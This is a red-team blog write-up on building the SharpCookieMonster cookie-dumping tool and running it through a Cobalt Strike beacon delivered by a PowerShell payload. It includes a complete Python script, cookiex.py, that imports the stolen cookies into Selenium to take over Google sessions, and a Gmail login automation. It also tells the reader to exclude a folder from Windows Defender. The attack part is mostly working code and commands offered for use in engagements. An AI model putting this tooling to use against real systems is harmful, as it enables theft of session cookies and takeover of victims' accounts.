# SharpCookieMonster - Tool - WriteUp

> Austin Lai | October 31st, 2022

---

## Table of Contents

<!-- TOC -->

- [SharpCookieMonster - Tool - WriteUp](#sharpcookiemonster---tool---writeup)
    - [Table of Contents](#table-of-contents)
    - [Description or Introduction](#description-or-introduction)
    - [Building SharpCookieMonster](#building-sharpcookiemonster)
        - [Merge WebSocket4Net using ILMerge](#merge-websocket4net-using-ilmerge)
    - [Testing SharpCookieMonster](#testing-sharpcookiemonster)
        - [Here our mini demo](#here-our-mini-demo)
        - [Using SharpCookieMonster with execute-assembly command from cobaltstrike beacon.](#using-sharpcookiemonster-with-execute-assembly-command-from-cobaltstrike-beacon)
    - [Evaluate SharpCookieMonster Usability](#evaluate-sharpcookiemonster-usability)
        - [**SharpCookieMonster with Python and Selenium**](#sharpcookiemonster-with-python-and-selenium)
        - [**cookiex.py**](#cookiexpy)
            - [**Script usage:**](#script-usage)
            - [**Script detail**](#script-detail)
        - [OPTIONAL - Convert cookiex.py to EXE](#optional---convert-cookiexpy-to-exe)
            - [Using pyinstaller](#using-pyinstaller)
            - [Using auto-py-to-exe for GUI pyinstaller](#using-auto-py-to-exe-for-gui-pyinstaller)
        - [PoC using cookiex.py to import cookies extracted from SharpCookieMonster](#poc-using-cookiexpy-to-import-cookies-extracted-from-sharpcookiemonster)
    - [Conclusion](#conclusion)

<!-- /TOC -->

## Description or Introduction

<!-- Description -->

[SharpCookieMonster](https://github.com/m0rv4i/SharpCookieMonster) is a C# project will dump cookies for all sites, even those with httpOnly/secure/session flags.

It can be used with C2 such as cobaltstrike with `execute-assembly`.

However, for this write up; we going to test and understand how it can be used with cobaltstrike.

<!-- /Description -->

<br>

## Building SharpCookieMonster

We start off with cloning the repo using command below:

`git clone https://github.com/m0rv4i/SharpCookieMonster.git`

![](/assets/images/2022-10-15-10-48-15.png)

It is a Visual Studio Solution Project.

![](/assets/images/2022-10-15-10-43-56.png)

Let's open with Visual Studio, expand the `solution` and right-click `references`.

![](/assets/images/2022-10-15-10-52-49.png)

Then select `Manage NuGet Packages...`.

![](/assets/images/2022-10-15-10-53-46.png)

You will notice the `NuGet Package Manager` panel showing the following prompt/error message.

![](/assets/images/2022-10-15-10-54-53.png)

It showing the `ILMerge` and `WebSocket4Net` packages are missing.

You will need to download the packages with **correct version stated** from <nuget.org> and install it manually.

For `ILMerge`, you can go to <https://www.nuget.org/packages/ilmerge/3.0.29> and download it.

![](/assets/images/2022-10-15-10-59-22.png)

Same goes for `WebSocket4Net, refer to <https://www.nuget.org/packages/WebSocket4Net>.

![](/assets/images/2022-10-15-11-01-04.png)

The downloaded packages are `.nupkg` files

![](/assets/images/2022-10-15-11-02-28.png)

Once we have the files, we will need to configure Visual Studio to use them as package source by clicking the `Setting|Options` button bring up `Package Source` configuration page as shown below:

![](/assets/images/2022-10-15-11-05-06.png)

On `Package Source` page, click the `add` button on top right.

![](/assets/images/2022-10-15-11-06-32.png)

It will automatically select and fill the information, however you will need to change it manually for `Source` path to where the `nupkg` file is located. You can also given a specific name for this new sources.

![](/assets/images/2022-10-15-11-08-54.png)

Once you have finished, click the **update** button to update the package source configuration.

![](/assets/images/2022-10-15-11-11-53.png)

It will reflect correctly

![](/assets/images/2022-10-15-11-12-19.png)

Once you done, just hit `OK` to close the configuration page.

In the `NuGet Package Manager` page, you will need to change the `Package Source` to the `LocalFiles` or whatever name you have given in previous steps. Once you have changed, click the `Restore` button just right up. It will autumatically resolved the missing packages issue.

![](/assets/images/2022-10-15-11-15-10.png)

Now we are good to go and build `SharpCookieMonster` by going to the `Build` tab and select `Build Solution` or you can use the shortcut of `Ctrl+Shift+B`.

![](/assets/images/2022-10-15-11-18-08.png)

There will be `Output` panel showing you have successfully built the `SharpCookieMonster`.

![](/assets/images/2022-10-15-11-18-52.png)

And `voila` we have our `SharpCookieMonster` binary.

![](/assets/images/2022-10-15-11-19-40.png)

<br>

### Merge WebSocket4Net using ILMerge

As the creator of `SharpCookieMonster` mentioned under section <https://github.com/m0rv4i/SharpCookieMonster#building>, we will need to merge `WebSocket4Net.dll` using `ILMerge` **in order to use WebSockets to communicate with Chrome**

Since we have `ILMerge` installed with `SharpCookieMonster`, it is located under the `packages` folder as shown below:

```
YOUR_SharpCookieMonster\packages\ILMerge.3.0.29\tools\net452
```

![](/assets/images/2022-10-15-12-16-26.png)

The `WebSocket4Net.dll` is located under the same folder as `SharpCookieMonster` binary.

![](/assets/images/2022-10-15-12-20-45.png)

To merge the `WebSocket4Net` library, first we need to rename the original `SharpCookieMonster` binary.

Then run the following command to merge the library:

```
ILMerge.exe /targetplatform:"v2,C:\Windows\Microsoft.NET\Framework\v2.0.50727" /out:SharpCookieMonster.exe SharpCookieMonsterOriginal.exe WebSocket4Net.dll
```

Here is the new `SharpCookieMonster` binary.

![](/assets/images/2022-10-15-12-22-41.png)

<br>

## Testing SharpCookieMonster

We have spined up Windows VM and install Google Chrome with testing user signed-in to `Gmail|Google|Chrome`.

For **testing purposes**, we need to add `Download` folders into Windows Defender Exclusion.

![](/assets/images/2022-10-15-11-34-17.png)

We also transfer `SharpCookieMonster` binary to the VM using python `updog`.

![](/assets/images/2022-10-15-12-31-29.png)

Now we can use `SharpCookieMonster` against any site to extracts cookies on the Windows VM with the command shown below:

```
SharpCookieMonster.exe https://www.google.com
```

<br>

### Here our mini demo

![](/assets/images/demo1-1.gif)

<br>

### Using SharpCookieMonster with `execute-assembly` command from cobaltstrike beacon.

First, let's start cobaltstrike teamserver.

![](/assets/images/2022-10-15-19-51-20.png)

Then, we connect cobaltstrike's client to teamserver.

![](/assets/images/2022-10-15-20-15-41.png)

Next, create `http` listener binding port `80` on cobaltstrike teamserver's IP.

![](/assets/images/2022-10-15-20-21-01.png)

Next, create `Scripted Web Delivery (Powershell)` payload as shown below:

![](/assets/images/2022-10-15-20-22-23.png)

Run the powershell payload generated from the previous step inside Windows VM.

![](/assets/images/2022-10-15-20-24-56.png)

And we got a callbacked on cobaltstrike from the beacon.

![](/assets/images/2022-10-15-20-25-22.png)

Now we use `execute-assembly` command from cobaltstrike to execute the `SharpCookieMonster` binary, below is our mini demo.

![](/assets/images/cobaltstrike-sharpcookiemonster.gif)

<br>

## Evaluate SharpCookieMonster Usability

As shown below, the <span style="color:green">**Left Green Arrow**</span> are the cookies extracted from Google Chrome and the <span style="color:red">**Right Red Arrow**</span> are the cookies extracted using SharpCookieMonster.

![](/assets/images/2022-10-19-103418.png)

The cookies json objects and formats extracted using SharpCookieMonster **not the updated** cookies objects and formats from Chrome.

Cookies <span style="color:green">**Left Green Arrow**</span> that extracted from Google Chrome can be used and imported into attacker machines without any issue and the session is valid.

However, cookies extracted using SharpCookieMonster show in the <span style="color:red">**Right Red Arrow**</span> panel cause session invalid and some cookies objects are unable to be imported due to the different formats and cookies objects extracted.

<br />

### **SharpCookieMonster with Python and Selenium**

We run some tests and researches on how the cookies extracted from SharpCookieMonster can be imported and re-used in actual red team engagement.

After a few tests, we finally figured out that cookies extracted using SharpCookieMonster can be imported with Python and Selenium.

We started to build the script called [cookiex.py](https://github.com/austin-lai/SharpCookieMonster-Tool-WriteUp/blob/master/cookiex.py).

<br />

### **[cookiex.py](https://github.com/austin-lai/SharpCookieMonster-Tool-WriteUp/blob/master/cookiex.py)**

There are several python packages to be installed and used in the script:

- [pip3 install undetected-chromedriver](https://pypi.org/project/undetected-chromedriver/)
- [pip3 install selenium](https://pypi.org/project/selenium/)
- `pip3 install getpass`
- `re`
- `os`
- `sys`
- `json`
- `time`
- `pickle`
- `textwrap`
- `argparse`

<br />

#### **Script usage:**

```zsh
usage: cookiex.py function[extract|import] EMAIL URL [options]

'cookiex.py' is a tool to automate the process of cookies extraction AND/OR import cookies to Chromium. 
'Password' will be prompted for you to key in.

positional arguments:
  {extract,import}  
                    extract:
                    Use 'cookiex.py' to extract cookies.
                    Provide email address + password along with target URL.

                    import:
                    Use 'cookiex.py' to import cookies.
                    Provide email address + password along with target URL.
                    When using 'import' mode, you will need Selenium WebDriver (chromedriver.exe).
                    - You can download from 'https://chromedriver.chromium.org/downloads'.
                    - You may need corresponding version of 'chromedriver'.

                    - If you not using 'cookiex.py' to extract cookies,
                      you will need to save the cookies in JSON format;
                      with the filename as 'cookies.json';
                      and put it in the same directory as the script.

  EMAIL             Specify target email.

  URL               Specify target url to be used with the cookies.

options:
  -h, --help        show this help message and exit
```

<br />

#### **Script detail**

The `cookiex.py` script can be found [here](https://github.com/austin-lai/SharpCookieMonster-Tool-WriteUp/blob/master/cookiex.py) or below:

<details><summary>Details of `cookiex.py` script</summary>

```python3
#!/usr/bin/env python3

#================================================================
# HEADER
#================================================================
#- IMPLEMENTATION
#-    title           cookiex.py v0.0.2
#-    version         cookiex.py v0.0.2
#-    author          Austin Lai
#-    date            31/10/2022
#-    notes           Note for the script
#-
#================================================================
#  HISTORY
#     21/10/2022 : Austin Lai : Script creation
#     31/10/2022 : Austin Lai : Add options and improvements
# 
#================================================================
#
#   #############################################################
#   # Script can be modified to statically specify email address and URL
#   # It can be a list form as well
#   # Statically specify targeted URL here.
#   # TARGET_URL = ''
#   # Statically specify targeted email address here.
#   # EMAIL = ''
#   ##############################################################
#
#% usage: cookiex.py function[extract|import] EMAIL URL [options]
#%
#%  'cookiex.py' is a tool to automate the process of cookies extraction AND/OR import cookies to Chromium. 
#%  'Password' will be prompted for you to key in.
#%
#% positional arguments:
#%   {extract,import}  
#%                     extract:
#%                     Use 'cookiex.py' to extract cookies.
#%                     Provide email address + password along with target URL.
#%
#%                     import:
#%                     Use 'cookiex.py' to import cookies.
#%                     Provide email address + password along with target URL.
#%                     When using 'import' mode, you will need Selenium WebDriver (chromedriver.exe).
#%                     - You can download from 'https://chromedriver.chromium.org/downloads'.
#%                     - You may need corresponding version of 'chromedriver'.
#%
#%                     - If you not using 'cookiex.py' to extract cookies,
#%                       you will need to save the cookies in JSON format;
#%                       with the filename as 'cookies.json';
#%                       and put it in the same directory as the script.
#%
#%   EMAIL             Specify target email.
#%
#%   URL               Specify target url to be used with the cookies.
#%
#% options:
#%   -h, --help        show this help message and exit
#%
#% EXAMPLES
#%    python3 cookiex.py extract xxx@xxx.xxx https://xxx.xxx.xxx
#%    python3 cookiex.py import xxx@xxx.xxx https://xxx.xxx.xxx
#%
#================================================================
#  TODO
#    
#
#================================================================
# END_OF_HEADER
#================================================================

from getpass import getpass
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import InvalidCookieDomainException

import re
import os
import sys
import json
import time
import pickle
import textwrap
import argparse
import undetected_chromedriver as uc



def save_cookie_json(browser, path = 'cookies.json'):

    if os.path.exists('cookies.json'):
        print('\'cookies.json\' exists, rename to cookies.json.old')

        try:
            os.rename('cookies.json', 'cookies.json.old')
        except FileExistsError:
            os.replace('cookies.json', 'cookies.json.old')

        # Save the new cookie as JSON file with the filename 'cookies.json'
        with open(path, 'w') as filehandler:
            json.dump(browser.get_cookies(), filehandler)

    else:
        print('\'cookies.json\' does not exist, saving \'cookies.json\'')

        # Save the new cookie as JSON format with the filename 'cookies.json'
        with open(path, 'w') as filehandler:
            json.dump(browser.get_cookies(), filehandler)



def save_cookie_pickle(browser, path = 'cookies.pkl'):

    if os.path.exists('cookies.pkl'):
        print('\'cookies.pkl\' exists, rename to \'cookies.pkl.old\'')

        try:
            os.rename('cookies.pkl', 'cookies.pkl.old')
        except FileExistsError:
            os.replace('cookies.pkl', 'cookies.pkl.old')

        # Save the new cookie as PICKLE format with the filename 'cookies.pkl'
        pickle.dump( browser.get_cookies() , open('cookies.pkl','wb'))
        time.sleep(3)

        # !!! DEBUG = Checking if cookies.pkl saved successfully and able to read its contents
        # pickle_cookies = pickle.load(open('cookies.pkl', 'rb'))
        # for cookie in pickle_cookies:
        #     print(cookie)

    else:
        print('\'cookies.pkl\' does not exist, saving \'cookies.pkl\'')

        # Save the cookie as PICKLE
        pickle.dump( browser.get_cookies() , open('cookies.pkl','wb'))  



def gmail_login(TARGET_URL,EMAIL,EMAIL_PASSWORD):

    url = TARGET_URL
    GMAIL = EMAIL
    passWord = EMAIL_PASSWORD

    try:
        chrome_options = uc.ChromeOptions()
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-popup-blocking')
        chrome_options.add_argument('--profile-directory=Default')
        chrome_options.add_argument('--ignore-certificate-errors')
        chrome_options.add_argument('--disable-plugins-discovery')
        chrome_options.add_argument('--enable-file-cookies')
        browser = uc.Chrome(options = chrome_options)
        WebDriverWait(driver = browser, timeout = 10).until(lambda x: x.execute_script('return document.readyState === "complete"'))
        browser.delete_all_cookies()
        time.sleep(2)

        browser.get(url)
        time.sleep(2)

        email = browser.find_element(By.ID, 'identifierId')
        email.click()
        email.send_keys(GMAIL)
        time.sleep(2)
        
        email.send_keys(Keys.ENTER)
        time.sleep(5)

        get_source = browser.page_source

        wrong_email = 'find your Google Account'

        if wrong_email in get_source:
            print('Could not find your Google Account')
            
            browser.close()
            browser.quit()
            browser.stop_client()
        
        else:
            actions = ActionChains(browser)
            actions.send_keys(passWord + Keys.ENTER)
            actions.perform()
            time.sleep(5)
            
            get_source = browser.page_source

            wrong_password = 'Wrong password'

            if wrong_password in get_source:
                print('Wrong password. Try again or click Forgot password to reset it')

                browser.close()
                browser.quit()
                browser.stop_client()

            else:
                save_cookie_json(browser)
                time.sleep(2)
                save_cookie_pickle(browser)
                time.sleep(2)
                
                print('Login has been successfully completed')
                time.sleep(2)

                browser.close()
                browser.quit()
                browser.stop_client()

    except Exception as e:
        pass

        # !!! DEBUG = Print error message if unable to login
        # print(e)



def load_cookie_pickle(browser, path = 'cookies.pkl'):

    # Load cookies.pkl and read its contents
    pickle_cookies = pickle.load(open('cookies.pkl', 'rb'))
    for cookie in pickle_cookies:
        try:
            browser.add_cookie(cookie)

            # !!! DEBUG = Check if cookies added successfully
            # print(cookie)
        except InvalidCookieDomainException as e:
            pass

            # !!! DEBUG = Print error message if unable to add cookie
            # print(e.msg)



def load_cookie_json(browser, path = 'cookies.json'):

    # Load cookies and read its contents
    with open('cookies.json', 'r') as cookies_file:
        json_cookies = json.load(cookies_file)

    for cookies_data in json_cookies:
        try:
            browser.add_cookie(cookies_data)

            # !!! DEBUG = Check if cookies added successfully
            # print(cookie)
        except InvalidCookieDomainException as e:
            pass

            # !!! DEBUG = Print error message if unable to add cookie
            # print(e.msg)



def login_with_cookie(TARGET_URL):

    url = TARGET_URL

    chrome_options = webdriver.ChromeOptions() 
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--disable-popup-blocking')
    chrome_options.add_argument('--profile-directory=Default')
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--disable-plugins-discovery')
    chrome_options.add_experimental_option('detach', True)
    chrome_options.add_argument('--enable-file-cookies')
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    browser = webdriver.Chrome(executable_path = r'Selenium_WebDriver\chromedriver.exe', options = chrome_options)
    WebDriverWait(driver = browser, timeout = 10).until(lambda x: x.execute_script('return document.readyState === "complete"'))
    browser.get('http://www.google.com')
    browser.delete_all_cookies()
    time.sleep(2)

    # Load PICKLE format cookie
    # load_cookie_pickle(browser)
    # time.sleep(2)

    # Load JSON format cookie
    # load_cookie_json(browser)
    # time.sleep(2)

    # Load JSON format cookie of SharpCookieMonster
    load_cookie_json(browser,'cookies.json')
    time.sleep(2)

    # Check if cookies added successfully
    print(browser.get_cookies())
    time.sleep(2)

    browser.get(url)
    time.sleep(2)



RE_EMAIL = re.compile(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$')
def email_type(value):
    if not RE_EMAIL.match(value):
        raise argparse.ArgumentTypeError(value + ' is not a valid email address format')
    return value



if __name__ == '__main__':

    parser = argparse.ArgumentParser(
                    prog = os.path.basename(sys.argv[0]),
                    description = ' \'%(prog)s\' is a tool to automate the process of cookies extraction AND/OR import cookies to Chromium. \n \'Password\' will be prompted for you to key in.\n',
                    usage = '%(prog)s function[extract|import] EMAIL URL [options]',
                    epilog = '',
                    add_help = True,
                    prefix_chars = '-/',
                    formatter_class = argparse.RawTextHelpFormatter)

    parser.add_argument('function',
                        type = str,
                        choices = ['extract','import'],
                        help = textwrap.dedent('''
                        extract:
                        Use \'%(prog)s\' to extract cookies.
                        Provide email address + password along with target URL.
                        
                        import:
                        Use \'%(prog)s\' to import cookies.
                        Provide email address + password along with target URL.
                        When using \'import\' mode, you will need Selenium WebDriver (chromedriver.exe).
                        - You can download from \'https://chromedriver.chromium.org/downloads\'.
                        - You may need corresponding version of \'chromedriver\'.\n
                        - If you not using \'cookiex.py\' to extract cookies,
                          you will need to save the cookies in JSON format;
                          with the filename as \'cookies.json\';
                          and put it in the same directory as the script.\n
                        '''))

    parser.add_argument('EMAIL',
                        type = email_type,
                        help = textwrap.dedent('''\
                        Specify target email.\n
                        '''))

    parser.add_argument('URL',
                        type = str,
                        help = textwrap.dedent('''\
                        Specify target url to be used with the cookies.
                        '''))

    parser.parse_args(args = None if sys.argv[1:] else ['--help'])


    ################################################################
    # Script can be modified to statically specify email address and URl
    # It can be a list form as well
    # Statically specify targeted URL here.
    # TARGET_URL = ''
    # Statically specify targeted email address here.
    # EMAIL = ''
    ################################################################


    global browser

    args = parser.parse_args()
    
    if args.function == 'extract':
        print('Using ' + os.path.basename(sys.argv[0]) + ' \'extract\' function.\n')

        EMAIL_PASSWORD = getpass('Enter Password for ' + args.EMAIL + ':')
        time.sleep(2)
        
        gmail_login(args.URL,args.EMAIL,EMAIL_PASSWORD)

    elif args.function == 'import':
        print('Using ' + os.path.basename(sys.argv[0]) + ' \'import\' function.\n')

        if ( (os.path.exists('cookies.json')) and (os.path.exists('cookies.pkl')) ):
            print('\'cookies.json\' and \'cookies.pkl\' exists, using extracted cookies to login.')

            login_with_cookie(args.URL)

        else:
            print('\'cookies.json\' and \'cookies.pkl\' do not exist.\n')
            print('You need to extract cookies using SharpCookieMonster.')
            print('OR')
            print('Use ' + os.path.basename(sys.argv[0]) + ' \'extract\' function to extract the cookies if you have the password.\n')

    else:
        parser.parse_args('--help')

```

</details>

<br />

### OPTIONAL - Convert `cookiex.py` to EXE

#### Using `pyinstaller`

    ```
    pip install pyinstaller
    ```

    Then run the following:

    ```
    pyinstaller --onefile --nowindowed cookiex.py
    ```

    The EXE will be available at `dist` folder.

<br />

#### Using `auto-py-to-exe` for GUI `pyinstaller`

    ```
    pip install auto-py-to-exe
    ```

    You may refer to <https://pypi.org/project/auto-py-to-exe/>

<br />

### PoC using `cookiex.py` to import cookies extracted from SharpCookieMonster

![](/assets/images/full-sharpcookiemonster-demo.gif)

<br />

## Conclusion

**SharpCookieMonster** can be used to extract cookies from Google Chrome along with cobaltstrike 'execute-assembly'.
With the script, we can now automate the process of import the cookies extracted from SharpCookieMonster and make use of it.
